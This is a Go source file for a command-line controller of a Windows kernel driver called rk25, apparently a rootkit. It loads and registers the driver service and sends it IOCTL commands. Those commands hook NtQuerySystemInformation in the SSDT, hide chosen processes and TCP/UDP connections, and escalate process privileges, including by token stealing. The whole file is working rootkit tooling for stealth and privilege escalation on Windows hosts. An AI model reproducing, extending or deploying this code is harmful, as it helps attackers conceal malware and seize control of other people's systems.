package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"rk25_mng/manager/commander"
	"rk25_mng/manager/commander/ioctl"
	"rk25_mng/manager/loader"

	"github.com/urfave/cli/v3"
)

var (
	defaultService = "rk25"
	defaultPath    = "C:\\rk25.sys"
)

var (
	strPath    = "path"
	strLoad    = "load"
	strUnload  = "unload"
	strService = "service"
)

func SetIsNotDefault(cmd *cli.Command, str string, set string) string {
	if cmd.String(str) != set {
		return cmd.String(str)
	} else {
		return set
	}
}

func MakeDeviceByService(service string) string {
	return fmt.Sprintf("\\\\.\\%v", service)
}

func GetBlockLoader() *cli.Command {
	newdl := func(cmd *cli.Command) *loader.DriverLoader {
		defaultPath = SetIsNotDefault(cmd, strPath, defaultPath)
		defaultService = SetIsNotDefault(cmd, strService, defaultService)
		return loader.NewDriverLoader(defaultService, defaultPath)
	}
	pathFlag := &cli.StringFlag{
		Name:    strPath,
		Value:   defaultPath,
		Usage:   "path to driver",
		Aliases: []string{"p"},
	}
	serviceFlag := &cli.StringFlag{
		Name:    strService,
		Value:   defaultService,
		Usage:   "service name",
		Aliases: []string{"s"},
	}
	return &cli.Command{
		Name:    "mng",
		Usage:   "driver manager",
		Aliases: []string{"m"},
		Commands: []*cli.Command{
			{
				Name:  "load",
				Usage: "loading driver",
				Flags: []cli.Flag{
					pathFlag,
					serviceFlag,
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					newdl(cmd).LoadDriver()
					return nil
				},
			},
			{
				Name:  "unload",
				Usage: "unloading driver",
				Flags: []cli.Flag{
					pathFlag,
					serviceFlag,
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					newdl(cmd).UnloadDriver()
					return nil
				},
			},
			{
				Name:  "reg",
				Usage: "register driver",
				Flags: []cli.Flag{
					pathFlag,
					serviceFlag,
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					newdl(cmd).RegisterService()
					return nil
				},
			},
			{
				Name:  "unreg",
				Usage: "unregister driver",
				Flags: []cli.Flag{
					pathFlag,
					serviceFlag,
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					newdl(cmd).UnregisterService()
					return nil
				},
			},
			{
				Name:  "start",
				Usage: "start driver",
				Flags: []cli.Flag{
					pathFlag,
					serviceFlag,
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					newdl(cmd).StartService()
					return nil
				},
			},
			{
				Name:  "stop",
				Usage: "stop driver",
				Flags: []cli.Flag{
					pathFlag,
					serviceFlag,
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					newdl(cmd).StopService()
					return nil
				},
			},
		},
	}
}

func GetBlockCommanderProcess() *cli.Command {
	flaghide := &cli.StringFlag{
		Name:    "method",
		Aliases: []string{"m"},
		Usage:   "supported: {'query', 'eproc'}",
		Value:   "query",
	}
	flagpriv := &cli.StringFlag{
		Name:    "method",
		Aliases: []string{"m"},
		Usage:   "supported: {'mod', 'tosys', 'steal'}",
		Value:   "tosys",
	}
	flags := []cli.Flag{
		&cli.StringFlag{
			Name:    "name",
			Usage:   "process name",
			Aliases: []string{"n"},
		},
		&cli.UintFlag{
			Name:    "pid",
			Usage:   "process pid (priority)",
			Aliases: []string{"p"},
		},
		&cli.StringFlag{
			Name:    strService,
			Value:   defaultService,
			Usage:   "service name",
			Aliases: []string{"s"},
		},
	}

	doFunc := func(
		cmd *cli.Command,
		action ioctl.RK25Action,
		errmsg string,
		do func(buffer []byte, action ioctl.RK25Action) error,
	) error {
		var err error
		pid := cmd.Uint("pid")
		name := cmd.String("name")

		var buffer []byte
		var target ioctl.RK25Action
		if pid != 0 {
			buf := new(bytes.Buffer)
			_ = binary.Write(buf, binary.BigEndian, pid)
			buffer = buf.Bytes()
			target = ioctl.RK25_TARGET_DECIMAL
		} else if len(name) != 0 {
			buffer = []byte(name)
			target = ioctl.RK25_TARGET_STRING
		} else {
			log.Println("PID (-p) or process name (-m) are not selected")
			log.Println("Use help for more information")
			return nil
		}

		if err = do(
			buffer,
			target|action,
		); err != nil {
			log.Printf("%v: %v\n", errmsg, err)
			return err
		}

		return nil
	}

	hideFunc := func(cmd *cli.Command, action ioctl.RK25Action) error {
		method := cmd.String("method")
		if method == "eproc" {
			action |= ioctl.RK25_PROCESS_AS_EPROCESS
		} else if method != "query" {
			return fmt.Errorf("method '%v' is not supported", method)
		}
		return doFunc(cmd, action, "Error hide process", commander.NewCommander(
			MakeDeviceByService(
				SetIsNotDefault(
					cmd,
					strService,
					defaultService,
				),
			),
		).ProcHide)
	}

	privFunc := func(cmd *cli.Command, action ioctl.RK25Action) error {
		method := cmd.String("method")
		switch method {
		case "tosys":
			{
				action |= ioctl.RK25_PROCESS_TO_SYSTEM
			}
		case "steal":
			{
				action |= ioctl.RK25_PROCESS_STEALING
			}
		case "mod":
			{
				action |= ioctl.RK25_PROCESS_MODIFY
			}
		default:
			return fmt.Errorf("method '%v' is not supported", method)
		}
		return doFunc(cmd, action, "Error hide process", commander.NewCommander(
			MakeDeviceByService(
				SetIsNotDefault(
					cmd,
					strService,
					defaultService,
				),
			),
		).ProcPriv)
	}

	doHook := func(cmd *cli.Command, act ioctl.RK25Action) error {
		method := cmd.String("method")
		var action ioctl.RK25Action
		switch method {
		case "replace":
			action = ioctl.RK25_HOOK_SSDT_NTQSI_REPLACE
		case "splicing":
			action = ioctl.RK25_HOOK_SSDT_NTQSI_SPLICING
		}
		buf := new(bytes.Buffer)
		_ = binary.Write(buf, binary.BigEndian, action)
		buffer := buf.Bytes()

		return commander.NewCommander(
			MakeDeviceByService(
				SetIsNotDefault(
					cmd,
					strService,
					defaultService,
				),
			),
		).ProcHook(buffer, action|act)
	}

	return &cli.Command{
		Name:    "proc",
		Aliases: []string{"p"},
		Usage:   "process operations",
		Commands: []*cli.Command{
			{
				Name:  "hook",
				Usage: "hook syscall NtQuerySystemInformation",
				Commands: []*cli.Command{
					{
						Name:    "eanble",
						Aliases: []string{"e"},
						Usage:   "enable hook",
						Flags: []cli.Flag{
							&cli.StringFlag{
								Name:    "method",
								Aliases: []string{"m"},
								Usage:   "supported: {'replace', 'splicing'}",
								Value:   "replace",
							},
							&cli.StringFlag{
								Name:    strService,
								Value:   defaultService,
								Usage:   "service name",
								Aliases: []string{"s"},
							},
						},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return doHook(cmd, ioctl.RK25_ACTION_ENABLE)
						},
					},
					{
						Name:    "disable",
						Aliases: []string{"d"},
						Usage:   "disable hook",
						Flags: []cli.Flag{
							&cli.StringFlag{
								Name:    "method",
								Aliases: []string{"m"},
								Usage:   "supported: {'replace', 'splicing'}",
								Value:   "replace",
							},
							&cli.StringFlag{
								Name:    strService,
								Value:   defaultService,
								Usage:   "service name",
								Aliases: []string{"s"},
							},
						},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return doHook(cmd, ioctl.RK25_ACTION_DISABLE)
						},
					},
				},
			},
			{
				Name:  "hide",
				Usage: "hide process by name or pid",
				Commands: []*cli.Command{
					{
						Name:    "enable",
						Aliases: []string{"e"},
						Usage:   "enable hide process by pid or name",
						Flags:   append(flags, flaghide),
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return hideFunc(cmd, ioctl.RK25_ACTION_ENABLE)
						},
					},
					{
						Name:    "disable",
						Aliases: []string{"d"},
						Usage:   "disable hide process by pid or name",
						Flags:   append(flags, flaghide),
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return hideFunc(cmd, ioctl.RK25_ACTION_DISABLE)
						},
					},
				},
			},
			{
				Name:  "priv",
				Usage: "process privilege escalation",
				Commands: []*cli.Command{
					{
						Name:    "enable",
						Aliases: []string{"e"},
						Usage:   "enable privilege escalation",
						Flags:   append(flags, flagpriv),
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return privFunc(cmd, ioctl.RK25_ACTION_ENABLE)
						},
					},
					{
						Name:    "disable",
						Aliases: []string{"d"},
						Usage:   "disable privilege escalation",
						Flags:   append(flags, flagpriv),
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return privFunc(cmd, ioctl.RK25_ACTION_DISABLE)
						},
					},
				},
			},
		},
	}
}

func GetBlockCommanderNetwork() *cli.Command {
	serviceflag := &cli.StringFlag{
		Name:    strService,
		Value:   defaultService,
		Usage:   "service name",
		Aliases: []string{"s"},
	}
	flags := []cli.Flag{
		&cli.StringFlag{
			Name:    "destination",
			Usage:   "target table: {'local', 'remote'}",
			Aliases: []string{"d"},
			Value:   "remote",
		},
		&cli.StringFlag{
			Name:    "protocol",
			Usage:   "target protocol: {'tcp', 'udp'}",
			Aliases: []string{"t"},
			Value:   "tcp",
		},
		&cli.StringFlag{
			Name:    "address",
			Usage:   "target ip address (priority)",
			Aliases: []string{"a"},
		},
		&cli.Int16Flag{
			Name:    "port",
			Usage:   "target port",
			Aliases: []string{"p"},
		},
		serviceflag,
	}

	doHook := func(action ioctl.RK25Action, cmd *cli.Command) error {
		act := action | ioctl.RK25_HOOK_NET_DISPATCHER
		buf := new(bytes.Buffer)
		_ = binary.Write(buf, binary.BigEndian, act)
		buffer := buf.Bytes()
		return commander.NewCommander(
			MakeDeviceByService(
				SetIsNotDefault(
					cmd,
					strService,
					defaultService,
				),
			),
		).NetHook(buffer, act)
	}

	doHide := func(action ioctl.RK25Action, cmd *cli.Command) error {
		protocol := cmd.String("protocol")
		dst := cmd.String("destination")
		ip := cmd.String("address")
		port := cmd.Int16("port")

		switch protocol {
		case "tcp":
			action |= ioctl.RK25_NET_TCP
		case "udp":
			action |= ioctl.RK25_NET_UDP
		default:
			return fmt.Errorf("protocol unsupported: use 'tcp' or 'udp'")
		}

		switch dst {
		case "local":
			action |= ioctl.RK25_NET_LOCAL
		case "remote":
			action |= ioctl.RK25_NET_REMOTE
		default:
			return fmt.Errorf("destination unsupported: use 'local' or 'remote'")
		}

		var buffer []byte
		if len(ip) != 0 {
			buffer = []byte(ip)
			action |= ioctl.RK25_TARGET_STRING
		} else if port != 0 {
			buf := new(bytes.Buffer)
			_ = binary.Write(buf, binary.BigEndian, port)
			buffer = buf.Bytes()
			action |= ioctl.RK25_TARGET_DECIMAL
		} else {
			return fmt.Errorf("target is not selected: use '--ip/-i' or '--port/-p'")
		}

		return commander.NewCommander(
			MakeDeviceByService(
				SetIsNotDefault(
					cmd,
					strService,
					defaultService,
				),
			),
		).NetHide(buffer, action)
	}

	return &cli.Command{
		Name:    "net",
		Aliases: []string{"n"},
		Usage:   "network operations",
		Commands: []*cli.Command{
			{
				Name:  "hook",
				Usage: "hook network driver",
				Commands: []*cli.Command{
					{
						Name:    "enable",
						Aliases: []string{"e"},
						Flags:   []cli.Flag{serviceflag},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return doHook(ioctl.RK25_ACTION_ENABLE, cmd)
						},
					},
					{
						Name:    "disable",
						Aliases: []string{"d"},
						Flags:   []cli.Flag{serviceflag},
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return doHook(ioctl.RK25_ACTION_DISABLE, cmd)
						},
					},
				},
			},
			{
				Name:  "hide",
				Usage: "hide network by ip or port",
				Commands: []*cli.Command{
					{
						Name:    "enable",
						Aliases: []string{"e"},
						Flags:   flags,
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return doHide(ioctl.RK25_ACTION_ENABLE, cmd)
						},
					},
					{
						Name:    "disable",
						Aliases: []string{"d"},
						Flags:   flags,
						Action: func(ctx context.Context, cmd *cli.Command) error {
							return doHide(ioctl.RK25_ACTION_DISABLE, cmd)
						},
					},
				},
			},
		},
	}
}

func GetBlockCommander() *cli.Command {
	return &cli.Command{
		Name:    "cmd",
		Aliases: []string{"c"},
		Usage:   "driver command execute",
		Commands: []*cli.Command{
			{
				Name:  "test",
				Usage: "send test message (only debug driver)",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:    strService,
						Value:   defaultService,
						Usage:   "service name",
						Aliases: []string{"s"},
					},
				},
				Action: func(ctx context.Context, cmd *cli.Command) error {
					if err := commander.NewCommander(MakeDeviceByService(SetIsNotDefault(cmd, strService, defaultService))).Test(); err != nil {
						log.Printf("Test failed: %v\n", err)
					} else {
						log.Println("Test success")
					}
					return nil
				},
			},
			GetBlockCommanderProcess(),
			GetBlockCommanderNetwork(),
		},
	}
}

func main() {
	if err := (&cli.Command{
		Commands: []*cli.Command{
			GetBlockLoader(),
			GetBlockCommander(),
		}}).Run(context.Background(), os.Args); err != nil {
		log.Fatal(err)
	}
}
